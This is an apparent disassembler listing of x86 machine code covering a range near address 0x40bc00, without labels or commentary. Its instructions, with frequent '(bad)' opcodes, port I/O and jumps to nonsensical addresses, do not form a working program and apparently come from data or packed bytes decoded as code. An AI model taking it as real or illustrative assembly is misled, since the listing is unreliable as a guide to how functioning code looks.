  40bc2e:	mov    DWORD PTR [ebx-0x5a],ebp
  40bc31:	int    0xe2
  40bc33:	lds    ebp,FWORD PTR [edi+eiz*2]
  40bc36:	cs xchg esi,eax
  40bc38:	std    
  40bc39:	push   ebx
  40bc3a:	stos   DWORD PTR es:[edi],eax
  40bc3b:	push   ebx
  40bc3c:	loop   0x40bcb9
  40bc3e:	aas    
  40bc3f:	adc    dh,BYTE PTR [ebx]
  40bc41:	lods   eax,DWORD PTR ds:[esi]
  40bc42:	add    eax,0xf328661a
  40bc47:	sbb    al,0x53
  40bc49:	pop    esi
  40bc4a:	sub    DWORD PTR [esi-0x7c],ecx
  40bc4d:	(bad)  
  40bc4e:	int3   
  40bc4f:	sbb    ecx,DWORD PTR [ebx]
  40bc51:	push   ds
  40bc52:	out    0x42,eax
  40bc54:	jg     0x40bc19
  40bc56:	test   BYTE PTR [edi+0x63],dh
  40bc59:	and    al,0xf2
  40bc5b:	mov    ds:0xa014b976,al
  40bc60:	enter  0xb036,0x74
  40bc64:	call   0x952d5997
  40bc69:	sti    
  40bc6a:	imul   esp,DWORD PTR [ecx+0x66],0x98f6a2ca
  40bc71:	lods   al,BYTE PTR ds:[esi]
  40bc72:	nop
  40bc73:	sti    
  40bc74:	inc    ebx
  40bc75:	test   al,0x9a
  40bc77:	sbb    al,0x51
  40bc79:	fs enter 0x9b9b,0x60
  40bc7e:	xor    eax,DWORD PTR [ecx-0x7b]
  40bc81:	jbe    0x40bc46
  40bc83:	call   0x9b72:0xd452e388
  40bc8a:	xchg   ebp,eax
  40bc8b:	lods   al,BYTE PTR ds:[esi]
  40bc8c:	mov    eax,ds:0x3a7f6c04
  40bc91:	out    0x30,al
  40bc93:	mov    dh,0x9f
  40bc95:	sub    DWORD PTR [edx+0x58],edi
  40bc98:	adc    esi,esp
  40bc9a:	or     ebp,DWORD PTR [esp+eax*2]
  40bc9d:	mov    ss,WORD PTR [edx-0x34]
  40bca0:	push   0x314743fc
  40bca5:	aas    
  40bca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bca7:	add    eax,DWORD PTR [eax+0x63]
  40bcaa:	xor    DWORD PTR [ebx],eax
  40bcac:	stc    
  40bcad:	jl     0x40bd13
  40bcaf:	ffree  st(0)
  40bcb1:	jno    0x40bd00
  40bcb3:	push   esp
  40bcb4:	mov    bh,0xb4
  40bcb6:	xchg   DWORD PTR [ebx-0x75],edi
  40bcb9:	dec    edi
  40bcba:	push   0x8036be98
  40bcbf:	into   
  40bcc0:	sbb    BYTE PTR [ebp-0x750bb35d],0xbd
  40bcc7:	es fwait
  40bcc9:	or     BYTE PTR [edx-0x54],bh
  40bccc:	cmp    BYTE PTR [edi-0x471912f2],ch
  40bcd2:	aaa    
  40bcd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcd5:	mov    ecx,0x5640a9e8
  40bcda:	lds    esi,FWORD PTR [ecx]
  40bcdc:	dec    esp
  40bcdd:	fnsave [ebx]
  40bcdf:	lods   al,BYTE PTR ds:[esi]
  40bce0:	pop    ebx
  40bce1:	jmp    0x88772feb
  40bce6:	or     esp,ebx
  40bce8:	add    al,0xa6
  40bcea:	or     bl,BYTE PTR [edx-0x647ede44]
  40bcf0:	fwait
  40bcf1:	int    0xe1
  40bcf3:	sub    BYTE PTR [ebp-0x75],dl
  40bcf6:	fimul  WORD PTR [ebp+0x0]
  40bcf9:	jmp    0x1a3c:0x2547c3fb
  40bd00:	mov    edx,0x28af4584
  40bd05:	imul   DWORD PTR [edi+ebp*8-0x629af2fc]
  40bd0c:	adc    BYTE PTR [edx+ecx*8],bl
  40bd0f:	test   BYTE PTR [ecx],dl
  40bd11:	bound  ecx,QWORD PTR [esp+eiz*8-0x5aa7a718]
  40bd18:	popf   
  40bd19:	sahf   
  40bd1a:	jmp    0xf7209ba1
  40bd1f:	arpl   WORD PTR [eax],di
  40bd21:	pop    ebp
  40bd22:	mov    cl,cl
  40bd24:	sbb    esi,edi
  40bd26:	mov    dl,BYTE PTR [edx+ecx*2]
  40bd29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd2a:	popa   
  40bd2b:	bound  esi,QWORD PTR [ebx+0x4d]
  40bd2e:	(bad)  
  40bd2f:	lea    esi,[edx-0x4dbe4e98]
  40bd35:	xchg   edx,eax
  40bd36:	popf   
  40bd37:	(bad)  
  40bd38:	and    BYTE PTR es:[esi],ch
  40bd3b:	mov    ebx,DWORD PTR [ebp-0x75]
  40bd3e:	retf   
  40bd3f:	lds    edx,FWORD PTR [edi]
  40bd41:	imul   ch
  40bd43:	shl    DWORD PTR [eax],0x65
  40bd46:	xor    al,0xba
  40bd48:	cmc    
  40bd49:	js     0x40bd08
  40bd4b:	adc    eax,DWORD PTR [edx]
  40bd4d:	push   eax
  40bd4e:	jbe    0x40bd3c
  40bd50:	pop    esi
  40bd51:	js     0x40bd56
  40bd53:	enter  0xb982,0x8f
  40bd57:	call   0x1738d117
  40bd5c:	sbb    ebp,edi
  40bd5e:	sbb    BYTE PTR [esi+0x74],dh
  40bd61:	sar    BYTE PTR [edx-0xc43a311],0x8a
  40bd68:	rcl    BYTE PTR [edi+0x51],1
  40bd6b:	adc    eax,0x84a2e0ac
  40bd70:	pop    edi
  40bd71:	xlat   BYTE PTR ds:[ebx]
  40bd72:	fwait
  40bd73:	mov    ecx,edi
  40bd75:	jp     0x40bdef
  40bd77:	sti    
  40bd78:	jb     0x40bde6
  40bd7a:	int    0x39
  40bd7c:	cmp    BYTE PTR [ecx+0x4debbb4b],0xf0
  40bd83:	sbb    al,0x51
  40bd85:	adc    DWORD PTR [esi+0x34],ebp
  40bd88:	cwde   
  40bd89:	dec    esp
  40bd8a:	cmp    bh,bh
  40bd8c:	stc    
  40bd8d:	xchg   ebx,eax
  40bd8e:	outs   dx,BYTE PTR ds:[esi]
  40bd8f:	popa   
  40bd90:	aaa    
  40bd91:	outs   dx,DWORD PTR ds:[esi]
  40bd92:	inc    BYTE PTR [esi]
  40bd94:	dec    ecx
  40bd95:	idiv   BYTE PTR [ecx+0x19]
  40bd98:	iret   
  40bd99:	sub    eax,0xcfd9f021
  40bd9e:	pop    edi
  40bd9f:	xchg   edx,eax
  40bda0:	mov    ecx,DWORD PTR [edi-0x56aa5c65]
  40bda6:	aam    0x94
  40bda8:	jl     0x40bdc8
  40bdaa:	js     0x40bdb4
  40bdac:	jp     0x40be1b
  40bdae:	aaa    
  40bdaf:	loopne 0x40bde0
  40bdb1:	add    al,0xd
  40bdb3:	icebp  
  40bdb4:	inc    esi
  40bdb5:	dec    ebx
  40bdb6:	mov    dl,0x1
  40bdb8:	cmc    
  40bdb9:	and    ebp,eax
  40bdbb:	shr    al,0xa1
  40bdbe:	push   0x18
  40bdc0:	xor    esi,DWORD PTR [ebx-0x25]
  40bdc3:	inc    esp
  40bdc4:	push   esp
  40bdc5:	rcl    BYTE PTR [ecx],cl
  40bdc7:	push   ecx
  40bdc8:	add    DWORD PTR [edi+esi*4+0x36],eax
  40bdcc:	mov    esi,0x5d8c9274
  40bdd1:	imul   eax,DWORD PTR [esi],0x19
  40bdd4:	adc    eax,0x55bd31cb
  40bdd9:	shl    bl,1
  40bddb:	mov    esp,0x6d62d5e1
  40bde0:	xchg   esi,eax
  40bde1:	cld    
  40bde2:	imul   eax,DWORD PTR ds:[ecx],0xf37189ac
  40bde9:	xchg   edx,eax
  40bdea:	dec    esp
  40bdeb:	sbb    BYTE PTR [edi+0x4379d542],al
  40bdf1:	mov    ah,0x94
  40bdf3:	imul   esi,DWORD PTR [edi-0x66d87e75],0x5ea9a151
  40bdfd:	mov    BYTE PTR ds:0x483a89e1,ah
  40be03:	cs js  0x40be81
  40be06:	fdiv   DWORD PTR [ebx+0x61]
  40be09:	fsubr  QWORD PTR [edi+0x2b]
  40be0c:	in     al,0x5d
  40be0e:	iret   
  40be0f:	gs pop ds
  40be11:	push   0xffffffd8
  40be13:	push   ss
  40be14:	popa   
  40be15:	jne    0x40bdae
  40be17:	pusha  
  40be18:	dec    ebp
  40be19:	xchg   ecx,eax
  40be1a:	cdq    
  40be1b:	pop    edi
  40be1c:	or     eax,0xa9ce8041
  40be21:	pushf  
  40be22:	jg     0x40be15
  40be24:	mov    ebp,?
  40be26:	xchg   ebp,eax
  40be27:	pop    edx
  40be28:	aam    0xa4
  40be2a:	mov    eax,0x7dd34388
  40be2f:	aas    
  40be30:	mov    eax,ds:0x22b90b92
  40be35:	push   esi
  40be36:	out    0xf2,al
  40be38:	mov    eax,0x7285ec91
  40be3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be3e:	aas    
  40be3f:	pop    ebp
  40be40:	scas   eax,DWORD PTR es:[edi]
  40be41:	push   cs
  40be42:	repnz lods eax,DWORD PTR ds:[esi]
  40be44:	push   edx
  40be45:	mov    edi,0xda034743
  40be4a:	cld    
  40be4b:	add    ecx,DWORD PTR [edx-0x49b3114d]
  40be51:	mov    ch,0x9a
  40be53:	inc    edx
  40be54:	mov    ds:0x8bada36e,eax
  40be59:	jb     0x40bdeb
  40be5b:	and    dl,BYTE PTR [edx-0x78]
  40be5e:	add    eax,0xcb42e2b8
  40be63:	mov    cl,dl
  40be65:	stos   DWORD PTR es:[edi],eax
  40be66:	jns    0x40bea1
  40be68:	ret    0x9ec5
  40be6b:	div    DWORD PTR [ebx+0x52c08d37]
  40be71:	(bad)  
  40be72:	in     al,dx
  40be73:	mov    bl,0x6a
  40be75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be76:	fld    DWORD PTR [esi+0x1e4429b8]
  40be7c:	fwait
  40be7d:	es jno 0x40be91
  40be80:	out    0xe0,al
  40be82:	inc    edx
  40be83:	jmp    0x40bee9
  40be85:	ss out dx,al
  40be87:	adc    al,0x89
  40be89:	lods   eax,DWORD PTR ds:[esi]
  40be8a:	call   ebx
  40be8c:	loop   0x40be87
  40be8e:	adc    BYTE PTR [ecx],ah
  40be90:	cld    
  40be91:	or     eax,0xb8f8488a
  40be96:	mov    cl,BYTE PTR [bp+di+0x5c]
  40be9a:	hlt    
  40be9b:	xlat   BYTE PTR ds:[ebx]
  40be9c:	jp     0x40be5f
  40be9e:	jge    0x40be7a
  40bea0:	out    0xa4,al
  40bea2:	add    ebp,DWORD PTR [edi-0x178e4a6d]
  40bea8:	or     eax,0xa0755dda
  40bead:	mov    bl,0xfa
  40beaf:	and    BYTE PTR [eax+0x4d707fa1],ch
  40beb5:	xchg   edi,eax
  40beb6:	dec    edx
  40beb7:	fwait
  40beb8:	pop    ebp
  40beb9:	or     eax,0xfc732cc3
  40bebe:	xlat   BYTE PTR ds:[ebx]
  40bebf:	dec    ecx
  40bec0:	mov    al,0x15
  40bec2:	les    edi,FWORD PTR [ebx]
  40bec4:	add    al,0xa9
  40bec6:	rol    DWORD PTR [ecx+0x6ef29443],1
  40becc:	je     0x40bf1a
  40bece:	jmp    0xdd5f:0xd701b194
  40bed5:	ins    DWORD PTR es:[edi],dx
  40bed6:	test   eax,0xa6d17c12
  40bedb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bedc:	icebp  
  40bedd:	push   ecx
  40bede:	repnz es and ch,dh
  40bee2:	sub    al,0x46
  40bee4:	sbb    ebx,DWORD PTR [eax-0x30]
  40bee7:	clc    
  40bee8:	cmp    BYTE PTR [ebp*2+0x7773c459],dl
  40beef:	dec    ecx
  40bef0:	add    DWORD PTR [edi+0x10efcd30],eax
  40bef6:	xchg   ebp,eax
  40bef7:	xchg   ecx,eax
  40bef8:	sti    
  40bef9:	inc    esp
  40befa:	xor    DWORD PTR [esi+0x16177be9],esp
  40bf00:	shr    dl,1
  40bf02:	ins    DWORD PTR es:[edi],dx
  40bf03:	sahf   
  40bf04:	jno    0x40bedf
  40bf06:	loope  0x40be93
  40bf08:	fcmovu st,st(4)
  40bf0a:	call   FWORD PTR [edi]
  40bf0c:	or     BYTE PTR [ecx+0x14],ah
  40bf0f:	jno    0x40beca
  40bf11:	gs inc esi
  40bf13:	mov    eax,ds:0xbf91c826
  40bf18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf19:	sahf   
  40bf1a:	push   edx
  40bf1b:	inc    BYTE PTR es:[edx+0x47faa8d3]
  40bf22:	push   es
  40bf23:	das    
  40bf24:	adc    DWORD PTR [ebx],ebp
  40bf26:	les    eax,FWORD PTR [esi-0x1b]
  40bf29:	stos   BYTE PTR es:[edi],al
  40bf2a:	adc    dl,BYTE PTR [ebp-0x2cddbb42]
  40bf30:	push   ecx
  40bf31:	inc    esp
  40bf32:	mov    dh,0x6
  40bf34:	pop    ds
  40bf35:	sbb    DWORD PTR [edi+0x3aabde97],ebx
  40bf3b:	mov    al,ds:0x990636ee
  40bf40:	xchg   esi,eax
  40bf41:	push   ds
  40bf42:	push   eax
  40bf43:	cmp    DWORD PTR [eax],esp
  40bf45:	outs   dx,DWORD PTR ds:[esi]
  40bf46:	lods   eax,DWORD PTR ds:[esi]
  40bf47:	scas   al,BYTE PTR es:[edi]
  40bf48:	inc    esp
  40bf49:	ja     0x40bf85
  40bf4b:	pop    edx
  40bf4c:	shl    BYTE PTR [edi-0x340f9295],1
  40bf52:	inc    ebp
  40bf53:	cwde   
  40bf54:	rol    dh,1
  40bf56:	sbb    DWORD PTR [esi+0x1d091f9e],esp
  40bf5c:	pop    esi
  40bf5d:	xor    eax,DWORD PTR [esi+ebp*4]
  40bf60:	retf   0x2d7e
  40bf63:	xor    BYTE PTR [ecx],ah
  40bf65:	outs   dx,BYTE PTR ds:[esi]
  40bf66:	adc    ecx,DWORD PTR [edx-0x5c]
  40bf69:	or     DWORD PTR [ecx+eax*8-0x64],0x66
  40bf6e:	adc    eax,0x368046b7
  40bf73:	sbb    dh,BYTE PTR [ebp-0x5d]
  40bf76:	arpl   WORD PTR [ebx+edx*4-0x469ac1c1],dx
  40bf7d:	lods   eax,DWORD PTR ds:[esi]
  40bf7e:	and    al,al
  40bf80:	nop
  40bf81:	ret    
  40bf82:	mov    WORD PTR [eax+0x7b],cs
  40bf85:	outs   dx,BYTE PTR ds:[esi]
  40bf86:	sub    ah,dh
  40bf88:	mov    sp,0x41f
  40bf8c:	int    0xcf
  40bf8e:	cmp    al,BYTE PTR [ebp+0x57cff524]
  40bf94:	mov    dl,0x2a
  40bf96:	mov    eax,0x19b45114
  40bf9b:	(bad)  
  40bf9c:	ret    0xbe05
  40bf9f:	mov    bl,0xfc
  40bfa1:	add    ecx,ecx
  40bfa3:	sub    eax,0x305ead67
  40bfa8:	lods   al,BYTE PTR ds:[esi]
  40bfa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfaa:	sar    BYTE PTR [edx],1
  40bfac:	in     al,dx
  40bfad:	sub    eax,0xe198cdc
  40bfb2:	sub    DWORD PTR [ecx+0x77],edx
  40bfb5:	xchg   BYTE PTR [ecx],bh
  40bfb7:	inc    esp
  40bfb8:	sbb    eax,DWORD PTR [edi+0x38]
  40bfbb:	and    al,0xee
  40bfbd:	dec    edx
  40bfbe:	(bad)  
  40bfbf:	in     eax,dx
  40bfc0:	nop
  40bfc1:	(bad)  
  40bfc3:	add    al,0x53
  40bfc5:	add    DWORD PTR [esi],ebx
  40bfc7:	ins    DWORD PTR es:[edi],dx
  40bfc8:	jno    0x40c02a
  40bfca:	push   ss
  40bfcb:	add    eax,0x86ef2b6e
  40bfd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfd1:	gs popa 
  40bfd3:	sbb    eax,0xcd2667e4
  40bfd8:	inc    edi
  40bfd9:	pusha  
  40bfda:	jmp    0x40bf64
  40bfdc:	scas   eax,DWORD PTR es:[edi]
  40bfdd:	pop    ds
  40bfde:	pop    esp
  40bfdf:	inc    eax
  40bfe0:	push   es
  40bfe1:	or     al,0xbc
  40bfe3:	dec    edi
  40bfe4:	daa    
  40bfe5:	mov    eax,edi
  40bfe7:	push   ebp
  40bfe8:	push   eax
  40bfe9:	out    0x40,eax
  40bfeb:	xor    eax,0x4b443558
  40bff0:	add    eax,0x1dbdc4ea
  40bff5:	or     edx,DWORD PTR [ecx-0x76]
  40bff8:	sbb    al,bl
  40bffa:	cmp    edx,eax
  40bffc:	icebp  
  40bffd:	pop    esp
  40bffe:	test   eax,0x18740a2a
  40c003:	mov    cl,0xe1
  40c005:	test   eax,0xc162561
  40c00a:	pop    es
  40c00b:	push   es
  40c00c:	cwde   
  40c00d:	iret   
  40c00e:	ds es das 
  40c011:	in     eax,0x25
  40c013:	cs daa 
  40c015:	or     BYTE PTR [edi],dh
  40c017:	xchg   edi,eax
  40c018:	pop    ecx
  40c019:	bound  edx,QWORD PTR [ebp-0x38]
  40c01c:	mov    dh,0xe6
  40c01e:	mov    ebp,0x3de01b41
  40c023:	and    eax,esi
  40c025:	cdq    
  40c026:	add    al,0x77
  40c028:	adc    al,0x6b
  40c02a:	jne    0x40c094
  40c02c:	push   es
  40c02d:	dec    ebx
  40c02e:	or     ch,BYTE PTR [edx]
  40c030:	cld    
  40c031:	add    ch,dh
  40c033:	(bad)  [ecx-0x23]
  40c036:	pop    esi
  40c037:	dec    ecx
  40c038:	(bad)  
  40c039:	mov    ebp,0x6133c0bc
  40c03e:	pop    edx
  40c03f:	icebp  
  40c040:	(bad)  
  40c041:	ror    BYTE PTR [ebp+0xb5394d8],cl
  40c047:	sbb    eax,0x79fe208
  40c04c:	jbe    0x40c07f
  40c04e:	aaa    
  40c04f:	mov    ecx,0x122d6387
  40c054:	adc    bl,BYTE PTR [ebx+0x6ad52f07]
  40c05a:	jno    0x40c08d
  40c05c:	inc    ecx
  40c05d:	jl     0x40c0a8
  40c05f:	shl    DWORD PTR [eax-0x703bd7ea],0xbf
  40c066:	xchg   ecx,eax
  40c067:	shrd   DWORD PTR fs:0x6c32b143,edi,0x4a
  40c070:	adc    DWORD PTR [eax+eax*2-0x5],eax
  40c074:	dec    edx
  40c075:	jb     0x40c0d8
  40c077:	mov    DWORD PTR [edi],ecx
  40c079:	sub    eax,0xe757f936
  40c07e:	ds (bad) 
  40c080:	mov    eax,ds:0xa5179e51
  40c085:	sub    eax,0xef46a396
  40c08a:	test   BYTE PTR [esi-0xd],ch
  40c08d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c08e:	iret   
  40c08f:	into   
  40c090:	or     DWORD PTR [esi-0x54],edx
  40c093:	arpl   WORD PTR [esi],cx
  40c095:	bound  esi,QWORD PTR [edi]
  40c097:	jge    0x40c076
  40c099:	lods   eax,DWORD PTR ds:[esi]
  40c09a:	outs   dx,BYTE PTR ds:[esi]
  40c09b:	icebp  
  40c09c:	mov    bh,0x76
  40c09e:	enter  0xedc5,0x3e
  40c0a2:	add    DWORD PTR [ebx],eax
  40c0a4:	je     0x40c0f8
  40c0a6:	mov    dl,0x1b
  40c0a8:	fs add eax,0xf77906fe
  40c0ae:	ins    DWORD PTR es:[edi],dx
  40c0af:	retf   0xba1e
  40c0b2:	mov    ds,WORD PTR [ebx+edx*2-0x687bdcc4]
  40c0b9:	sbb    eax,0xba10ee20
  40c0be:	and    BYTE PTR [ebx-0x5b],al
  40c0c1:	cmp    BYTE PTR [ebx],0xdd
  40c0c4:	into   
  40c0c5:	xlat   BYTE PTR ds:[ebx]
  40c0c6:	jg     0x40c074
  40c0c8:	jae    0x40c0a7
  40c0ca:	dec    eax
  40c0cb:	jmp    0xd20e409c
  40c0d0:	bswap  ecx
  40c0d2:	out    0xa,eax
  40c0d4:	pop    edx
  40c0d5:	dec    esi
  40c0d6:	sub    BYTE PTR [ecx+0x2874a074],cl
  40c0dc:	adc    dh,dh
  40c0de:	xor    ecx,ebx
  40c0e0:	mov    ebx,0xd3c81384
  40c0e5:	and    DWORD PTR ds:0x26b08d8e,esi
  40c0eb:	xchg   ecx,eax
  40c0ec:	pusha  
  40c0ed:	mov    cl,0x12
  40c0ef:	xchg   ecx,eax
  40c0f0:	sub    al,0x65
  40c0f2:	int3   
  40c0f3:	addr16 mov edx,0x9317c4b6
  40c0f9:	jne    0x40c110
  40c0fb:	fdivr  QWORD PTR [eax+0x3]
  40c0fe:	aaa    
  40c0ff:	and    eax,0x7df2a01f
  40c104:	jns    0x40c10e
  40c106:	in     al,dx
  40c107:	repz dec esi
  40c109:	cmp    DWORD PTR [eax],edx
  40c10b:	pop    ebp
  40c10c:	xor    eax,0x5d4c9bf5
  40c111:	clc    
  40c112:	push   es
  40c113:	sub    al,0x4e
  40c115:	sar    BYTE PTR [esi-0x894923f],1
  40c11b:	inc    edi
  40c11c:	fcomp  QWORD PTR [ecx+0x63]
  40c11f:	xchg   ebx,eax
  40c120:	outs   dx,DWORD PTR ds:[esi]
  40c121:	shl    BYTE PTR [ebx-0x26],1
  40c124:	std    
  40c125:	pop    esp
  40c126:	xor    al,0x30
  40c128:	push   eax
  40c129:	mov    dl,0xf
  40c12b:	stc    
  40c12c:	mov    esp,0x3bb896db
  40c131:	cli    
  40c132:	cli    
  40c133:	pop    ebp
  40c134:	cdq    
  40c135:	push   ds
  40c136:	int3   
  40c137:	repnz adc ah,BYTE PTR [edi]
  40c13a:	or     bh,BYTE PTR [ebx]
  40c13c:	and    al,0x7e
  40c13e:	fbld   TBYTE PTR [edi+0x5c29f91a]
  40c144:	adc    al,0x31
  40c146:	out    dx,eax
  40c147:	cmc    
  40c148:	mov    bl,0x65
  40c14a:	xchg   esp,eax
  40c14b:	test   ebp,edx
  40c14d:	rol    dh,cl
  40c14f:	std    
  40c150:	sbb    DWORD PTR [esi+0x52],ebx
  40c153:	popf   
  40c154:	dec    esi
  40c155:	push   es
  40c156:	lock push esi
  40c158:	pop    ds
  40c159:	inc    esp
  40c15a:	into   
  40c15b:	shr    dl,0x81
  40c15e:	dec    esi
  40c15f:	pushf  
  40c160:	adc    DWORD PTR ss:[ebx],esp
  40c163:	jo     0x40c110
  40c165:	jmp    0x22e12fc4
  40c16a:	push   es
  40c16b:	adc    bl,BYTE PTR [ecx+eiz*2]
  40c16e:	xor    al,0x95
  40c170:	cli    
  40c171:	je     0x40c13c
  40c173:	and    DWORD PTR [ebx-0x11],esi
  40c176:	dec    esi
  40c177:	out    dx,eax
  40c178:	and    edx,DWORD PTR ds:0xc7b3ff6
  40c17e:	xor    dh,BYTE PTR [edx-0x3bd87c1d]
  40c184:	pushf  
  40c185:	push   ebx
  40c186:	xchg   edx,eax
  40c187:	int    0x97
  40c189:	add    BYTE PTR [eax],dl
  40c18b:	mov    bh,dh
  40c18d:	out    dx,eax
  40c18e:	mov    edi,0x4d38d1d9
  40c193:	jg     0x40c144
  40c195:	adc    BYTE PTR [eax+0x14],ch
  40c198:	popf   
  40c199:	add    eax,0xdac46126
  40c19e:	cmp    ah,BYTE PTR [ebp-0x28]
  40c1a1:	ret    0xeea0
  40c1a4:	add    al,0xee
  40c1a6:	jmp    DWORD PTR [edx-0x351014ee]
  40c1ac:	cs jmp 0x472b:0xdcd0bc70
  40c1b4:	xchg   ecx,eax
  40c1b5:	mov    al,gs:0x7f85ca17
  40c1bb:	pusha  
  40c1bc:	push   ds
  40c1bd:	repnz push 0x1e
  40c1c0:	shl    ebx,0xd
  40c1c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1c4:	dec    ecx
  40c1c5:	xchg   ebx,eax
  40c1c6:	aad    0xe1
  40c1c8:	mov    WORD PTR [edi-0x3ca5189a],fs
  40c1ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1cf:	cmp    eax,0x6e6cd0ee
  40c1d4:	xchg   ecx,eax
  40c1d5:	mov    al,ds:0x77389f97
  40c1da:	icebp  
  40c1db:	popa   
  40c1dc:	add    DWORD PTR [edi+0x1a],0xf3c040fa
  40c1e3:	aad    0x6f
  40c1e5:	ret    
  40c1e6:	mov    ah,0x90
  40c1e8:	in     al,0xaf
  40c1ea:	mov    edx,0x55f24e76
  40c1ef:	hlt    
  40c1f0:	int    0xf9
  40c1f2:	ja     0x40c205
  40c1f4:	add    eax,0x21b8362b
  40c1f9:	mov    bl,al
  40c1fb:	jo     0x40c1b4
  40c1fd:	cli    
  40c1fe:	dec    esi
  40c1ff:	mov    al,0xa3
  40c201:	in     eax,0x4f
  40c203:	and    eax,0x22d4012f
  40c208:	or     BYTE PTR [ebp-0x22a38c75],dh
  40c20e:	xor    esp,DWORD PTR [esi+0x6f]
  40c211:	aas    
  40c212:	aas    
  40c213:	dec    edi
  40c214:	push   eax
  40c215:	test   al,0x3
  40c217:	inc    edx
  40c218:	mov    eax,ds:0x9dba8dd2
  40c21d:	lods   al,BYTE PTR ds:[esi]
  40c21e:	imul   esi,DWORD PTR [edi],0x4
  40c221:	mov    al,ds:0xee0ff795
  40c226:	aam    0x8c
  40c228:	mov    ebp,0x6421a7f4
  40c22d:	stc    
  40c22e:	adc    bl,ah
  40c230:	jg     0x40c25d
  40c232:	rol    ah,1
  40c234:	aaa    
  40c235:	cld    
  40c236:	aas    
  40c237:	(bad)  
  40c238:	adc    edi,DWORD PTR [ecx+0x60]
  40c23b:	push   edi
  40c23c:	scas   eax,DWORD PTR es:[edi]
  40c23d:	pop    esp
  40c23e:	std    
  40c23f:	inc    ebp
  40c240:	aam    0x77
  40c242:	mov    es,WORD PTR [edi+0x34559ce5]
  40c248:	jmp    0xcb36b47f
  40c24d:	sahf   
  40c24e:	popf   
  40c24f:	retf   0x7930
  40c252:	aas    
  40c253:	mov    BYTE PTR [edx+edi*4-0x51],dl
  40c257:	fwait
  40c258:	dec    eax
  40c259:	mov    eax,0x35ee7c3
  40c25e:	cmc    
  40c25f:	xchg   esp,eax
  40c260:	and    cl,BYTE PTR [esi]
  40c262:	sub    esi,0xffffffa7
  40c265:	push   eax
  40c266:	add    eax,0x4f6e294f
  40c26b:	and    bh,dl
  40c26d:	pop    ebp
  40c26e:	mov    ds:0x29393e6a,eax
  40c273:	or     DWORD PTR [edi],0xffffffa2
  40c276:	lea    edx,[esi+ecx*4]
  40c279:	jnp    0x40c29e
  40c27b:	or     bl,BYTE PTR [eax+0x18d963e6]
  40c281:	jo     0x40c2f1
  40c283:	fld    DWORD PTR [ebx+ecx*2+0x295dc70e]
  40c28a:	jmp    0x2926:0xcbde07fa
  40c291:	int    0x59
  40c293:	and    DWORD PTR [ecx],edi
  40c295:	aaa    
  40c296:	push   esi
  40c297:	xchg   esi,eax
  40c298:	mov    gs,edx
  40c29a:	lea    esp,ds:0xec35aa67
  40c2a0:	mov    ebx,0x5a20e0bb
  40c2a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2a6:	mov    edi,0xec0b056b
  40c2ab:	fstp   DWORD PTR [eax+esi*8]
  40c2ae:	jno    0x40c2da
  40c2b0:	frndint 
  40c2b2:	(bad)  
  40c2b3:	or     BYTE PTR [ebx-0x7e],ch
  40c2b6:	fiadd  DWORD PTR [ebx-0x67]
  40c2b9:	aad    0x38
  40c2bb:	and    BYTE PTR [edx+0x78],cl
  40c2be:	imul   esi,DWORD PTR ds:0xcfad2a13,0x65
  40c2c5:	cmp    al,0x4a
  40c2c7:	mov    edx,0xc7edc94
  40c2cc:	int    0x9
  40c2ce:	int3   
  40c2cf:	stos   BYTE PTR es:[edi],al
  40c2d0:	mov    ch,BYTE PTR [edx+ecx*1]
  40c2d3:	(bad)  
  40c2d4:	xor    DWORD PTR [ebx+0xd],ebp
  40c2d7:	fild   QWORD PTR [edx+0x1ac76f70]
  40c2dd:	in     al,0xab
  40c2df:	and    DWORD PTR [ebx+eax*4+0x7af63ab4],edi
  40c2e6:	(bad)  
  40c2e7:	jo     0x40c28b
  40c2e9:	mov    esi,0x5e29772d
  40c2ee:	lahf   
  40c2ef:	add    esp,DWORD PTR [ebp-0x5d]
  40c2f2:	dec    esi
  40c2f3:	mov    ah,0xae
  40c2f5:	stos   BYTE PTR es:[edi],al
  40c2f6:	dec    edi
  40c2f7:	test   BYTE PTR [ecx+0xe788bf7],bl
  40c2fd:	or     eax,0xa7a7fbc5
  40c302:	inc    eax
  40c303:	aam    0xbe
  40c305:	js     0x40c2ea
  40c307:	es inc edx
  40c309:	sub    ch,dh
  40c30b:	aam    0x69
  40c30d:	sub    al,0xca
  40c30f:	rcl    BYTE PTR [ebx],cl
  40c311:	stc    
  40c312:	adc    BYTE PTR [ecx+0x49e6ee41],dh
  40c318:	lods   eax,DWORD PTR ds:[esi]
  40c319:	aas    
  40c31a:	fimul  DWORD PTR [eax]
  40c31c:	lods   eax,DWORD PTR ds:[esi]
  40c31d:	dec    esi
  40c31e:	pop    ss
  40c31f:	and    DWORD PTR [edi],ebx
  40c321:	inc    ebx
  40c322:	jmp    0x756a:0x85c74bc4
  40c329:	(bad)  
  40c32b:	xchg   ebx,eax
  40c32c:	cli    
  40c32d:	adc    dl,BYTE PTR [edi-0x3c]
  40c330:	das    
  40c331:	mov    bl,0xa5
  40c333:	fisub  DWORD PTR [ebp-0x4f379cb]
  40c339:	jg     0x40c2dc
  40c33b:	(bad)  
  40c33c:	xchg   ecx,eax
  40c33d:	loope  0x40c302
  40c33f:	jno    0x40c328
  40c341:	in     eax,dx
  40c342:	setg   BYTE PTR [eax-0x7b29dcec]
  40c349:	jge    0x40c30b
  40c34b:	ins    BYTE PTR es:[edi],dx
  40c34c:	cld    
  40c34d:	dec    ebx
  40c34e:	cwde   
  40c34f:	test   edi,ebx
  40c351:	mov    fs,WORD PTR ds:0x57743e6c
  40c357:	jp     0x40c339
  40c359:	lods   al,BYTE PTR ds:[esi]
  40c35a:	push   eax
  40c35b:	pop    edx
  40c35c:	outs   dx,DWORD PTR ds:[esi]
